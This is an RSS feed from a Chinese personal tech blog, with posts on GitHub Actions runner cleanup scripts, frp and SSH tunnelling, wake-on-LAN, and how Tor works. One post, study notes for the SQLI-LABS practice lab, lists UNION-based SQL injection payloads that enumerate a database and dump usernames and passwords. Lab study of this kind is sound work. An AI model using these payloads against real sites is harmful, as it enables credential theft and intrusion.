<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Avalon</title><link>https://littlestate.github.io/</link><description>Recent content on Avalon</description><generator>Hugo -- 0.140.1</generator><language>zh-cn</language><lastBuildDate>Mon, 30 Dec 2024 10:35:00 +0800</lastBuildDate><atom:link href="https://littlestate.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Github Actions 自动清理工作空间</title><link>https://littlestate.github.io/posts/github-actions-self-hosted-%E8%87%AA%E5%8A%A8%E6%B8%85%E7%90%86%E5%B7%A5%E4%BD%9C%E7%A9%BA%E9%97%B4/</link><pubDate>Mon, 30 Dec 2024 10:35:00 +0800</pubDate><guid>https://littlestate.github.io/posts/github-actions-self-hosted-%E8%87%AA%E5%8A%A8%E6%B8%85%E7%90%86%E5%B7%A5%E4%BD%9C%E7%A9%BA%E9%97%B4/</guid><description>&lt;h1 id="使用-self-hosted">使用 self-hosted&lt;/h1>
&lt;p>当使用自建的 runner 时，checkout 插件并没有自动清空工作空间，这时可以使用环境变量配置前置、后置脚本。&lt;/p>
&lt;p>&lt;code>ACTIONS_RUNNER_HOOK_JOB_STARTED=/opt/actions-runner/scripts/cleanup.sh&lt;/code>&lt;br>
&lt;code>ACTIONS_RUNNER_HOOK_JOB_COMPLETED=/opt/actions-runner/scripts/cleanup.sh&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env bash
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>rm -rf $GITHUB_WORKSPACE/*
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rm -rf $GITHUB_WORKSPACE/.??*
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="使用-self-hosted-container">使用 self-hosted container&lt;/h1>
&lt;p>当使用 container 时就遇到问题了，我的 runner 使用单独的用户运行，并且没有 sudo 权限，而容器运行后，生成的工作空间全为 root 权限，导致我的后置任务，也无法删除。&lt;/p>
&lt;p>这时可以使用容器来提权，修改工作空间的权限后再执行删除操作。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env bash
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e"># ================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 文件路径 /opt/actions-runner/scripts/cleanup.sh&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># ================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">[&lt;/span> -n &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>GITHUB_WORKSPACE&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">]&lt;/span>; &lt;span style="color:#66d9ef">then&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> docker run --rm &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> -v $GITHUB_WORKSPACE/../../:/workspace &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> busybox:latest &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> /bin/sh -c &lt;span style="color:#e6db74">&amp;#34;chown -R &lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>id -u&lt;span style="color:#66d9ef">)&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>id -g&lt;span style="color:#66d9ef">)&lt;/span>&lt;span style="color:#e6db74"> /workspace&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> rm -rf &lt;span style="color:#e6db74">${&lt;/span>GITHUB_WORKSPACE&lt;span style="color:#e6db74">}&lt;/span>/&lt;span style="color:#f92672">{&lt;/span>.??*,*&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">fi&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="配置-env">配置 .env&lt;/h1>
&lt;p>使用该清理脚本，需要在 &lt;code>/opt/actions-runner/.env&lt;/code> 文件中添加环境变量，之后运行 &lt;code>sudo ./svc.sh stop &amp;amp;&amp;amp; sudo ./svc.sh start&lt;/code> 重启 runner&lt;/p></description></item><item><title>My First Post</title><link>https://littlestate.github.io/posts/my-first-post/</link><pubDate>Sat, 28 Dec 2024 01:06:37 +0800</pubDate><guid>https://littlestate.github.io/posts/my-first-post/</guid><description>&lt;h1 id="title">title&lt;/h1>
&lt;p>已迁移至 Hugo 并使用 Github Actions 强力驱动&lt;/p></description></item><item><title>通过公网 IP 使用 RDP 与 WOL</title><link>https://littlestate.github.io/posts/%E9%80%9A%E8%BF%87%E5%85%AC%E7%BD%91-ip-%E4%BD%BF%E7%94%A8-rdp-%E4%B8%8E-wol/</link><pubDate>Sun, 28 Nov 2021 17:57:57 +0000</pubDate><guid>https://littlestate.github.io/posts/%E9%80%9A%E8%BF%87%E5%85%AC%E7%BD%91-ip-%E4%BD%BF%E7%94%A8-rdp-%E4%B8%8E-wol/</guid><description>&lt;h2 id="frp">frp&lt;/h2>
&lt;p>在还没有公网 IP 时，通过 frp 将 3389 端口映射出来，通过 RDP 访问到主机后进行以下的操作。&lt;/p>
&lt;h2 id="ddns">DDNS&lt;/h2>
&lt;ol>
&lt;li>首先在红米 AC2100 中支持的 DDNS 服务商中选择了 no-ip.com。&lt;/li>
&lt;li>注册并将配置好的 Hostname 填写到路由器的 DDNS 中，用户名就是注册 no-ip.com 时的。&lt;/li>
&lt;/ol>
&lt;h2 id="远程开机">远程开机&lt;/h2>
&lt;p>上面配置完后应该就可以通过域名来远程控制主机了，但是还没法远程开机。&lt;/p>
&lt;ol>
&lt;li>开启主板 BIOS 中的 wake on lan。&lt;/li>
&lt;li>勾选电脑网卡中的以下选项&lt;br>
&lt;img alt="wol" loading="lazy" src="https://littlestate.github.io/posts/%E9%80%9A%E8%BF%87%E5%85%AC%E7%BD%91-ip-%E4%BD%BF%E7%94%A8-rdp-%E4%B8%8E-wol/wol.png">&lt;/li>
&lt;li>开启以下选项&lt;br>
&lt;img alt="wol" loading="lazy" src="https://littlestate.github.io/posts/%E9%80%9A%E8%BF%87%E5%85%AC%E7%BD%91-ip-%E4%BD%BF%E7%94%A8-rdp-%E4%B8%8E-wol/wol2.png">&lt;/li>
&lt;li>关闭电源中的快速启动（重要！）&lt;br>
&lt;img alt="wol" loading="lazy" src="https://littlestate.github.io/posts/%E9%80%9A%E8%BF%87%E5%85%AC%E7%BD%91-ip-%E4%BD%BF%E7%94%A8-rdp-%E4%B8%8E-wol/wol3.png">&lt;/li>
&lt;/ol>
&lt;h2 id="给路由器添加静态-arp">给路由器添加静态 arp&lt;/h2>
&lt;p>编辑 /etc/rc.local在exit的上一行加入arp -s 192.168.31.XXX xx:xx:xx:xx:xx:xx就可以了。&lt;/p>
&lt;p>参考：&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://www.right.com.cn/forum/thread-4032490-1-1.html">AC2100官方固件开启SSH方法&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://blog.haitianhome.com/miwifi-wol-waiwang.html">小米路由器成功外网WOL唤醒&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://zhuanlan.zhihu.com/p/260531160">小米、红米 AC2100 一键开启 SSH，可自定义安装各种插件&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>frp 配置并设为启动项</title><link>https://littlestate.github.io/posts/frp-%E9%85%8D%E7%BD%AE%E5%B9%B6%E8%AE%BE%E4%B8%BA%E5%90%AF%E5%8A%A8%E9%A1%B9/</link><pubDate>Fri, 26 Nov 2021 16:09:21 +0000</pubDate><guid>https://littlestate.github.io/posts/frp-%E9%85%8D%E7%BD%AE%E5%B9%B6%E8%AE%BE%E4%B8%BA%E5%90%AF%E5%8A%A8%E9%A1%B9/</guid><description>&lt;h2 id="一般配置">一般配置&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; frps.ini&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[common]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bind_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">7000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">token&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;lt;token&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">vhost_http_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">8080&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">dashboard_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">7900&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">dashboard_user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;lt;user&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">dashboard_pwd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;lt;pwd&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>bind_port 是 frp 服务端、客户端连接时使用的端口号。&lt;/li>
&lt;li>token 是用来鉴权的。&lt;/li>
&lt;li>vhost_http_port 是下面配置的 [web] 服务穿透出来的端口，可以通过访问公网 vps 的这个端口访问到 [web]。&lt;/li>
&lt;li>dashboard 是在 vps 上开启了一个 web 管理页面。&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; frpc.ini&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[common]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;lt;ip_addr&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">7000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">token&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;lt;token&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[ssh]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">tcp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">local_ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">127.0.0.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">local_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">22&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">remote_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">6000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 让外网可以访问到内网的某个 Web 服务&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[web]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">http&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">local_ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">127.0.0.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">local_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">80&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">custom_domains&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;lt;domain&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; Remote Desktop Protocol&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[rdp]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">tcp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">local_ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">127.0.0.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">local_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">3389&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">remote_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">3389&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>token 必须和服务端相同。&lt;/li>
&lt;li>[ssh] 的 remote_port 是在公网 vps 上监听了 6000 端口，通过这个端口就可以访问到 [ssh] 设定好的 local_port。&lt;/li>
&lt;li>[web] 的 custom_domains 可以是本机 host 文件静态解析的域名。&lt;/li>
&lt;/ul>
&lt;h2 id="stcp">stcp&lt;/h2>
&lt;p>上面 tcp 仅需要 vps 配置好 fprs 客户端使用 frpc 连接就好。而 stcp 多了一步验证，vps 中的 frps.ini 配置还是和上面相同&lt;/p></description></item><item><title>SQLI-LABS</title><link>https://littlestate.github.io/posts/sqli-labs/</link><pubDate>Wed, 24 Nov 2021 01:55:24 +0000</pubDate><guid>https://littlestate.github.io/posts/sqli-labs/</guid><description>&lt;h1 id="crud">CRUD&lt;/h1>
&lt;ul>
&lt;li>查库：&lt;code>SELECT schema_name FROM information_schema.schemata&lt;/code>&lt;/li>
&lt;li>查表：&lt;code>SELECT table_name FROM information_schema.tables WHERE table_schema='security'&lt;/code>&lt;/li>
&lt;li>查列：&lt;code>SELECT column_name FROM information_schema.columns WHERE table_name='users'&lt;/code>&lt;/li>
&lt;li>查字段：&lt;code>SELECT username, password FROM security.users&lt;/code>&lt;/li>
&lt;/ul>
&lt;h1 id="一些函数">一些函数&lt;/h1>
&lt;ul>
&lt;li>SELECT SYSTEM_USER();&lt;/li>
&lt;li>SELECT USER();&lt;/li>
&lt;li>SELECT DATABASE();&lt;/li>
&lt;li>SELECT VERSION();&lt;/li>
&lt;li>SELECT @@datadir; &amp;ndash; 查看 mysql 路径&lt;/li>
&lt;li>SELECT @@version_compile_os; &amp;ndash; 查看版本&lt;/li>
&lt;/ul>
&lt;h1 id="注入">注入&lt;/h1>
&lt;ol>
&lt;li>查看是否有注入：&lt;br>
&lt;code>?id=1'&lt;/code>&lt;/li>
&lt;li>查看有多少列：&lt;br>
&lt;code>?id=1' ORDER BY 10 --+&lt;/code>&lt;/li>
&lt;li>查看哪些数据可以回显：&lt;br>
&lt;code>?id=-1' UNION SELECT 1,2,3 --+&lt;/code>&lt;/li>
&lt;li>查看当前数据库：&lt;br>
&lt;code>?id=-1' UNION SELECT 1,2,DATABASE() --+&lt;/code>&lt;/li>
&lt;li>查看数据库：&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>显示下标为2开始后的1位数据&lt;br>
&lt;code>?id=-1' UNION SELECT 1,2,schema_name FROM information_schema.schemata LIMIT 2,1 --+&lt;/code>&lt;/li>
&lt;li>在第三列显示所有数据库名&lt;br>
&lt;code>?id=-1' UNION SELECT 1,2,GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.schemata --+&lt;/code>&lt;/li>
&lt;/ul>
&lt;ol start="6">
&lt;li>查表&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>手动筛选&lt;br>
&lt;code>?id=-1' UNION SELECT 1,2,table_name FROM information_schema.tables WHERE table_schema='security' LIMIT 0,1 --+&lt;/code>&lt;/li>
&lt;li>显示所有&lt;br>
&lt;code>?id=-1' UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='security' --+&lt;/code>&lt;/li>
&lt;/ul>
&lt;ol start="7">
&lt;li>查列&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>&lt;code>?id=1' UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_schema='security' --+&lt;/code>&lt;/li>
&lt;li>&lt;code>?id=1' UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' --+&lt;/code>&lt;/li>
&lt;/ul>
&lt;ol start="8">
&lt;li>查数据&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>&lt;code>?id=-1' UNION SELECT 1,2,CONCAT_WS('~', username, password) FROM security.users LIMIT 0,1 --+&lt;/code>&lt;/li>
&lt;li>&lt;code>?id=-1' UNION SELECT 1,2,GROUP_CONCAT(CONCAT_WS('~', username, password)) FROM security.users --+&lt;/code>&lt;/li>
&lt;/ul></description></item><item><title>SSH Port Forwarding</title><link>https://littlestate.github.io/posts/ssh-port-forwarding/</link><pubDate>Tue, 23 Nov 2021 22:31:45 +0000</pubDate><guid>https://littlestate.github.io/posts/ssh-port-forwarding/</guid><description>&lt;h2 id="动态转发">动态转发&lt;/h2>
&lt;p>因为 SSH 服务器要去访问哪一个网站，完全是动态的，取决于原始通信，动态转发只需要把本地端口绑定到 SSH 服务器，所以叫动态转发。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ssh -D port tunnel-host -N
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>D 表示动态转发，所有经过这个本地监听端口的流量，都通过 SSH 隧道。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>N 参数用于端口转发，表示建立的 SSH 只用于端口转发，不能执行远程命令，这样可以提供安全性。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="本地转发正向代理">本地转发（正向代理）&lt;/h2>
&lt;p>&lt;img alt="cpf" loading="lazy" src="https://littlestate.github.io/posts/ssh-port-forwarding/simple-tunnel.png">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ssh -L port:host:hostport tunnel-host -N
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>上面就是将 tunnel-host 作为跳板机，在本地 port 端口与目标服务器（这里是 host）的 hostport　端口之间建立了一个 ssh 隧道。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ssh -L 8080:www:80 tunnel-host -N
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>访问 clienthost 8080 端口时，就相当于通过跳板服务器 tunnel-host 访问 www:80。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>www:80 可以是跳板机局域网中的一个设备。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="远程转发反向代理">远程转发（反向代理）&lt;/h2>
&lt;p>&lt;img alt="rpf" loading="lazy" src="https://littlestate.github.io/posts/ssh-port-forwarding/rpf.jpg">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ssh -R port:host:hostport tunnel-host -N
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>访问 tunnel-host:port 会访问到本地的 host:hostport，可以通过这个功能将本地服务转发出去。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ssh -R 8080:192.168.1.100:80 root@x.x.x.x -p 0~65535 -N
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如上，访问公网 x.x.x.x:8080 端口的话，可以访问到内网的 192.168.1.100:80。&lt;/p></description></item><item><title>洋葱路由</title><link>https://littlestate.github.io/posts/%E6%B4%8B%E8%91%B1%E8%B7%AF%E7%94%B1/</link><pubDate>Fri, 18 Jun 2021 00:28:57 +0000</pubDate><guid>https://littlestate.github.io/posts/%E6%B4%8B%E8%91%B1%E8%B7%AF%E7%94%B1/</guid><description>&lt;p>&amp;hellip;&lt;/p>
&lt;!-- more -->
&lt;h1 id="简介">简介&lt;/h1>
&lt;p>&lt;strong>洋葱路由&lt;/strong>（英语：Onion routing）为一种在电脑网络上匿名沟通的技术。在洋葱路由的网络中，消息一层一层的加密包装成像洋葱一样的数据包，并经由一系列被称作洋葱路由器的网络节点发送，每经过一个洋葱路由器会将数据包的最外层解密，直至目的地时将最后一层解密，目的地因而能获得原始消息。而因为透过这一系列的加密包装，每一个网络节点（包含目的地）都只能知道上一个节点的位置，但无法知道整个发送路径以及原发送者的地址。&lt;/p>
&lt;h1 id="原理">原理&lt;/h1>
&lt;ol>
&lt;li>
&lt;p>用户都希望能隐藏自己的真实 ip 地址，让对方无法精准定位找到自己。此时可以找个代理服务器转发流量。最常见的方式就是代理，图示如下：
&lt;img src="2.png" width="50%" height="50%" />
但是正常情况下，server 是有日志的，记录了 proxy 的 ip 地址（如果 server 在国内，运营商也有相应的记录）；同时国内的运营商也有 client 的访问记录。所以用这样的方式来隐藏真实 IP 是不可行的。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>增加到两个 proxy 节点
&lt;img src="3.png" width="50%" height="50%" />&lt;/p>
&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>client-&amp;gt;proxy1：国内运营商知道 client 给 proxy1 发数据了&lt;/li>
&lt;li>proxy1-&amp;gt;proxy2：由于两个节点都在海外，正常情况下，国内运营商是不知道这层代理关系的&lt;/li>
&lt;li>proxy2-&amp;gt;server：正常情况下，server 有日志记录；如果 server 在国内，国内的运营商也有记录&lt;/li>
&lt;li>关键的是 proxy1-&amp;gt;proxy2：别人无法拿到这两个节点的数据，所以不好追查&lt;/li>
&lt;/ul>
&lt;ol start="3">
&lt;li>既然两个 proxy 已经不好追查了，那么继续增加 proxy 节点到 3 个，如实现了匿名通信的自由软件 tor
简单的核心原理：
&lt;img src="4.png" width="50%" height="50%" />&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>使用 tor 浏览器访问网页，除了走正常的 http/https 协议的流程外，tor 还需要先访问目录服务器，从目录服务器拿到中继服务器的地址和公钥（这是 tor 的致命问题之一：目录服务器的数量有限，一旦屏蔽目录服务器，tor 浏览器就用不了了）src/app/config/ 这里面存放了主备用目录服务器的 ip 地址、端口和 id
&lt;img loading="lazy" src="https://littlestate.github.io/posts/%E6%B4%8B%E8%91%B1%E8%B7%AF%E7%94%B1/5.png">&lt;/li>
&lt;li>再通过中继服务器层层加密并转发流量。（使用非对称加密）&lt;/li>
&lt;li>建立通信的过程
&lt;ol>
&lt;li>客户端与目录服务器建立链接，并从目录服务器中选取一个时延最低的服务器作为第一个中继服务器OR1；&lt;/li>
&lt;li>客户端向OR1发送一个请求建链请求，OR1验证完客户端的合法性后生成一对密钥（公钥pubkey_OR1_Client、私钥prikey_OR1_Client）,然后将公钥pubkey_OR1_Client发回给客户端（至此，客户端成功的建立了其与OR1的通信链路）；&lt;/li>
&lt;li>客户端又从目录服务器中选择一个时延最低的中继服务器OR2，并向OR1发送一个数据包：使用pubkey_OR1_Client加密OR2的地址；&lt;/li>
&lt;li>OR1收到数据包后使用prikey_OR1_Client解开数据包，发现是一个让其自身与另外一个服务器OR2建立链接的请求，那么OR1重复步骤2与OR2建立链接，并将OR2返回的OR1与OR2链路的公钥pubkey_OR1_OR2返回给客户端；&lt;/li>
&lt;li>客户端重复步骤3、4，建立OR2与OR3之间的通信链路，并接收到OR2与OR3之间链路的公钥pubkey_OR2_OR3；&lt;/li>
&lt;li>至此，客户端与3个中继服务器之间的链路/circuit已经成功建立，客户端拥有3把公钥：pubkey_Client_OR1、pubkey_OR1_OR2、pubkey_OR2_OR3。&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>通信链路建立了，接下来该发数据了：
&lt;ol>
&lt;li>客户端将要发送的数据（data）经过3层加密包裹：*第一层：使用pubkey_OR2_OR3加密data：pubkey_OR2_OR3(data)；*第二层：使用pubkey_OR1_OR2加密第一层加密后的数据：pubkey_OR1_OR2(pubkey_OR2_OR3(data))；*第三层：使用pubkey_Client_OR1加密第二层机密后的数据：
&lt;code>pubkey_Client_OR1(pubkey_OR1_OR2(pubkey_OR2_OR3(data)))；&lt;/code>&lt;/li>
&lt;li>OR1收到客户端发来的数据后使用其与Client链路的私钥prikey_Client_OR1解开数据包，发现数据包是发往OR2的，那么OR1就将解开后的数据包发送给OR2；&lt;/li>
&lt;li>OR2收到OR1发来的数据包重复OR1的步骤：将接收的数据包解开发往OR3；&lt;/li>
&lt;li>OR3收到数据包后，使用prikey_OR2_OR3解开数据包，这个时候的数据包是客户端要发往目的服务器的真实数据包data。此时，OR3就将data路由给目标服务器。&lt;/li>
&lt;li>这就是洋葱名称的来源：数据被公钥层层加密发送。每个中继节点收到数据后都用自己保存的私钥层层解密，直到看到最终的目的数据包；
&lt;img src="1.png" width="50%" height="50%" />&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ul>
&lt;h1 id="缺点">缺点&lt;/h1>
&lt;ul>
&lt;li>并不是绝对的安全，因为最后一个节点和目的节点的链路是公开透明的。&lt;/li>
&lt;li>长时间用同一条链路，也容易通过类似超级ping的工具猜出真实的ip地址，所以tor会不定时更换链路
&lt;img src="6.png" width="50%" height="50%" />
比较明显的特征如下：&lt;/li>
&lt;li>TCP前面3次握手后建立连接&lt;/li>
&lt;li>然后发送4个数据包，每个包的格式、长度完全一样
这也是tor的弱点之一： 浏览器和osbf之间的通信格式是固定的，很容易通过机器学习的模型、甚至是人为预设的规则检测到。
&lt;img loading="lazy" src="https://littlestate.github.io/posts/%E6%B4%8B%E8%91%B1%E8%B7%AF%E7%94%B1/7.png">&lt;/li>
&lt;/ul>
